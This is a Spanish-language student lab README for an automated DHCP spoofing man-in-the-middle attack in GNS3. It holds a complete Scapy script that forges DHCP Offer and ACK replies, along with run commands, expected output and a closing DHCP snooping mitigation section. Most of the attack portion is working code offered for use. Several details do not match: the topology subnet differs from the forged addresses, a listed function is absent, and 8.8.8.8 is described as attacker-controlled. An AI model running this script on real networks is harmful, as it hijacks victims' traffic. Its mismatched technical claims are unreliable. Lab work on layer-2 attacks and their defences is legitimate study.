# 🎣 DHCP Spoofing — Script de Ataque Automatizado MitM

<div align="center">

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-2.5.0%2B-green?style=for-the-badge)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-purple?style=for-the-badge&logo=kalilinux)
![GNS3](https://img.shields.io/badge/GNS3-2.2.x-orange?style=for-the-badge)
![Licencia](https://img.shields.io/badge/Uso-Educativo-red?style=for-the-badge)

**Lab. Networking — Ataques MitM y Mitigación de Capa 2**

| Campo | Detalle |
|---|---|
| **Alumno** | Wilfri Solano Frias |
| **Matrícula** | 2024-2364 |
| **Asignatura** | Seguridad de Redes |

[📹 Video Demostrativo](https://www.youtube.com/watch?v=UtyPoIAu-VY&list=PLGfNWxn7Di3BhsEEifmTJKXP4_U9fla7P&index=2)

</div>

---

## ⚠️ Advertencia Legal

> **Este script es exclusivamente para uso educativo en entornos de laboratorio controlados (GNS3 / EVE-NG).**
> Su ejecución en redes reales sin autorización explícita por escrito constituye un delito informático
> penalizado por las leyes de ciberseguridad. El autor no se responsabiliza del mal uso de esta herramienta.

---

## 📋 Tabla de Contenidos

- [Descripción](#descripción)
- [Funcionamiento del Ataque](#funcionamiento-del-ataque)
- [Topología de Red](#topología-de-red)
- [Requisitos](#requisitos)
- [Parámetros Configurables](#parámetros-configurables)
- [Uso](#uso)
- [Código del Script](#código-del-script)
- [Explicación Técnica](#explicación-técnica)
- [Evidencias](#evidencias)
- [Contramedidas](#contramedidas)
- [Referencias](#referencias)

---

## 📋 Descripción

Este script automatiza el ataque de **DHCP Spoofing**, explotando la vulnerabilidad de los clientes DHCP que no validan la identidad del servidor. El atacante captura solicitudes DHCP legítimas e inyecta respuestas falsas, asignando a la víctima una dirección IP controlada por el atacante, convirtiéndose en el gateway falso para interceptar todo el tráfico (Man-in-the-Middle).

### ¿Cómo funciona el ataque?

```
[Víctima - Windows 10]  →  Envía DHCP Discover
        ↓
[Switch SWI2]  →  Replica por broadcast a todos los puertos
        ↓
[Atacante - eth0]  ←  Captura DHCP Discover
        ↓
    Genera respuesta DHCP Offer falsa:
    · IP víctima  →  192.168.1.150 (asignada)
    · Gateway  →  192.168.1.254 (MAC atacante)
    · DNS  →  8.8.8.8 (controlado)
        ↓
      Inyecta respuesta fraudulenta
        ↓
[Víctima]  →  Acepta configuración falsa
        ↓
[Resultado]  →  Atacante se convierte en MITM
                Acceso a todo el tráfico de la víctima
```

---

## 🧱 Topología de Red

```
                    ┌─────────────┐
                    │   ROUTER1   │
                    │ (DHCP Srv)  │
                    │192.168.64.1 │
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    SWI2     │ ← Switch Cisco
                    │  (Switch)   │
                    └──┬────┬─────┼──────────┐
                e0/0 ║    ║ e0/1 ║ e0/2     ║
                     ║    ║      ║          │
             ┌──────┴──┐  │      │    ┌─────┴──────┐
             │ ROUTER  │  │      │    │  Windows10 │
             │ Legítimo│  │      │    │   (Víctima)│
             └─────────┘  │      │    └────────────┘
                          │      │
                    ┌─────┴─┐    │
                    │Atacante   │
                    │192.168.64.23
                    │VLAN 1     │
                    └───────────┘
```

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN | Rol |
|---|---|---|---|---|---|
| ROUTER1 (DHCP) | e0/0 | 192.168.64.1 | /24 | VLAN 1 | Servidor DHCP Legítimo |
| SWI2 (Objetivo) | e0/0,e0/1,e0/2 | N/A | N/A | Troncal | Switch bajo prueba |
| **Atacante** | **eth0** | **192.168.64.23** | **/24** | **VLAN 1** | **Equipo atacante** |
| **Windows10** | **eth0** | **192.168.1.150** | **/24** | **VLAN 1** | **Víctima (falsa IP)** |

---

## ⚙️ Requisitos

| Categoría | Requisito | Versión |
|---|---|---|
| Sistema Operativo | Kali Linux | 2024.x o superior |
| Lenguaje | Python | 3.10 o superior |
| Librería principal | Scapy | 2.5.0 o superior |
| Módulo Scapy | DHCP, sniff, sendp | Incluidos |
| Simulador de red | GNS3 / EVE-NG | 2.2.x o superior |
| Privilegios | root / sudo | Obligatorio |
| Dispositivo objetivo | Cliente DHCP en red | Servidor DHCP legítimo |

### Instalación de Dependencias

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Scapy
pip install scapy

# Verificar instalación
python3 -c "from scapy.all import *; print('Scapy listo')"
```

---

## 🔧 Parámetros Configurables

| Variable | Tipo | Valor por Defecto | Descripción |
|---|---|---|---|
| `INTERFACE` | `str` | `eth0` | Interfaz de red para capturar e inyectar |
| `ATTACKER_MAC` | `str` | `02:00:11:22:33:44` | MAC ficticia del servidor falso |
| `FAKE_SERVER_IP` | `str` | `192.168.1.254` | Gateway falso (atacante) |
| `VICTIM_ASSIGNED_IP` | `str` | `192.168.1.150` | IP asignada a la víctima |
| `DNS_SERVER` | `str` | `8.8.8.8` | Servidor DNS falso |
| `NETMASK` | `str` | `255.255.255.0` | Máscara de red forzada |

---

## 🚀 Uso

```bash
# Clonar el repositorio
git clone https://github.com/wilfrisf-sudo/DHCP-SPOOFING
cd DHCP-SPOOFING

# Ejecutar con privilegios de root (obligatorio)
sudo python3 Ataque_DHCP_Spoofing.py
```

### Salida esperada

```
[*] Iniciando ataque DHCP Spoofing...
[*] Escuchando solicitudes DHCP en eth0...
[+] Solicitud DHCP Discover capturada (MAC: aa:bb:cc:dd:ee:ff)
[*] Inyectando DHCP Offer falsa...
[+] DHCP Offer enviada (IP: 192.168.1.150, Gateway: 192.168.1.254)
[+] Capturado DHCP Request de la víctima
[+] DHCP Ack fraudulenta enviada
[*] ¡Víctima comprometida! Tráfico interceptado.
```

---

## 📝 Código del Script

```python
#!/usr/bin/env python3
from scapy.all import *

INTERFACE = "eth0"
ATTACKER_MAC = "02:00:11:22:33:44"
FAKE_SERVER_IP = "192.168.1.254"
VICTIM_ASSIGNED_IP = "192.168.1.150"
NETMASK = "255.255.255.0"
DNS_SERVER = "8.8.8.8"

def procesar_dhcp(pkt):
    """Captura y responde a solicitudes DHCP"""
    if DHCP not in pkt:
        return
    
    dhcp_type = None
    for opt in pkt[DHCP].options:
        if opt[0] == "message-type":
            dhcp_type = opt[1]
            break
    
    # Cliente envía DHCP Discover
    if dhcp_type == 1:
        print(f"[+] DHCP Discover capturada (MAC: {pkt[Ether].src})")
        
        # Crear DHCP Offer fraudulenta
        respuesta = Ether(src=ATTACKER_MAC, dst=pkt[Ether].src)
        respuesta = respuesta / IP(src=FAKE_SERVER_IP, dst="255.255.255.255")
        respuesta = respuesta / UDP(sport=67, dport=68)
        respuesta = respuesta / BOOTP(op=2, yiaddr=VICTIM_ASSIGNED_IP, siaddr=FAKE_SERVER_IP)
        respuesta = respuesta / DHCP(options=[
            ("message-type", "offer"),
            ("subnet_mask", NETMASK),
            ("router", FAKE_SERVER_IP),
            ("dns_servers", DNS_SERVER),
            ("lease_time", 3600),
            "end"
        ])
        
        print("[*] Inyectando DHCP Offer falsa...")
        sendp(respuesta, iface=INTERFACE, verbose=False)
        print(f"[+] DHCP Offer enviada (IP: {VICTIM_ASSIGNED_IP}, Gateway: {FAKE_SERVER_IP})")
    
    # Cliente envía DHCP Request
    elif dhcp_type == 3:
        print("[+] Capturado DHCP Request de la víctima")
        
        # Crear DHCP Ack fraudulenta
        respuesta = Ether(src=ATTACKER_MAC, dst=pkt[Ether].src)
        respuesta = respuesta / IP(src=FAKE_SERVER_IP, dst="255.255.255.255")
        respuesta = respuesta / UDP(sport=67, dport=68)
        respuesta = respuesta / BOOTP(op=2, yiaddr=VICTIM_ASSIGNED_IP, siaddr=FAKE_SERVER_IP)
        respuesta = respuesta / DHCP(options=[
            ("message-type", "ack"),
            ("subnet_mask", NETMASK),
            ("router", FAKE_SERVER_IP),
            ("dns_servers", DNS_SERVER),
            ("lease_time", 3600),
            "end"
        ])
        
        sendp(respuesta, iface=INTERFACE, verbose=False)
        print("[+] DHCP Ack fraudulenta enviada")
        print("[*] ¡Víctima comprometida! Tráfico interceptado.")

def ataque_dhcp_spoofing():
    """Función principal de ataque"""
    print("[*] Iniciando ataque DHCP Spoofing...")
    print(f"[*] Escuchando solicitudes DHCP en {INTERFACE}...\n")
    
    try:
        sniff(iface=INTERFACE, prn=procesar_dhcp, filter="udp port 67 or udp port 68")
    except KeyboardInterrupt:
        print("\n[-] Ataque detenido por el usuario.")

if __name__ == "__main__":
    import os
    if os.getuid() != 0:
        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_DHCP_Spoofing.py")
        exit(1)
    
    ataque_dhcp_spoofing()
```

---

## 🔍 Explicación Técnica del Funcionamiento

| # | Función / Bloque | Descripción Técnica |
|---|---|---|
| 1 | **Importaciones** | Carga `scapy.all` para sniffing e inyección DHCP |
| 2 | **`procesar_dhcp()`** | Callback que procesa cada paquete DHCP capturado |
| 3 | **`message-type` 1** | Detecta DHCP Discover del cliente |
| 4 | **`DHCP Offer`** | Respuesta fraudulenta con IP y gateway falso |
| 5 | **`message-type` 3** | Detecta DHCP Request del cliente |
| 6 | **`DHCP Ack`** | Confirmación fraudulenta (finaliza handshake) |
| 7 | **`FAKE_SERVER_IP`** | Gateway atacante (posición MITM) |
| 8 | **`sniff(filter=...)`** | Captura tráfico UDP puerto 67-68 (DHCP) |
| 9 | **`sendp()`** | Inyección de respuestas falsas a nivel L2 |
| 10 | **`verificacion_root()`** | Valida permisos de administrador |

---

## 📸 Evidencias del Ataque

### Evidencia 1 — Topología en GNS3

<img width="715" height="522" alt="imagen" src="https://github.com/user-attachments/assets/8b27957e-4962-43e4-9718-66ac57b56b5d" />

*Diseño de la topología virtualizada con servidor DHCP, switch y víctima*

### Evidencia 2 — Captura de Asignación Legítima

<img width="581" height="206" alt="imagen" src="https://github.com/user-attachments/assets/7efb916e-3beb-4888-bbf9-b269c7b0e4b9" />

*Configuración normal del cliente DHCP antes del ataque*

### Evidencia 3 — Ejecución del Script

<img width="625" height="90" alt="imagen" src="https://github.com/user-attachments/assets/ee7abe69-6c27-4cdd-8852-c24d66c6c10b" />

*Script capturando solicitudes DHCP e inyectando respuestas falsas*

### Evidencia 4 — Host Víctima Comprometida

<img width="532" height="206" alt="imagen" src="https://github.com/user-attachments/assets/677e31aa-b71e-44d7-a57f-6904806991c1" />

*Víctima recibe IP falsa (192.168.1.150) y gateway malicioso (192.168.1.254)*

### Evidencia 5 — Aplicación de Contramedidas

<img width="323" height="206" alt="imagen" src="https://github.com/user-attachments/assets/4716fe46-2d1d-48e8-baf3-ad802293b852" />

*DHCP Snooping habilitado en el switch*

---

## 🛡️ Contramedidas y Mitigación

### DHCP Snooping (Mitigación en el Switch)

Valida automáticamente los servidores DHCP legítimos, bloqueando respuestas de dispositivos no autorizados:

```ios
ip dhcp snooping
ip dhcp snooping vlan 1

interface Ethernet0/0
 ip dhcp snooping trust
 
interface Ethernet0/1
 ip dhcp snooping trust
 
interface Ethernet0/2
 ! No confiar en este puerto (usuario)
end
```

### Tabla de Contramedidas

| Medida | Descripción | Impacto |
|---|---|---|
| `ip dhcp snooping` | Habilita validación de DHCP | **Bloquea el ataque** |
| `dhcp snooping trust` | Marca puertos legítimos | Valida servidor real |
| Puertos no autorizados | Rechaza DHCP de usuarios | Previene spoofing |
| DHCP Rate Limiting | Limita solicitudes/segundo | Detecta ataques DoS |

---

## 📚 Referencias

- [Cisco — DHCP Snooping](https://www.cisco.com/c/en/us/support/docs/switches/catalyst-6500-series-switches/23948-156.html)
- [Scapy Documentation — DHCP](https://scapy.readthedocs.io/)
- [GNS3 Documentation](https://docs.gns3.com/)

---

<div align="center">

**Wilfri Solano Frias · Matrícula 2024-2364 · Seguridad de Redes**

*Laboratorio desarrollado con fines exclusivamente educativos*

</div>
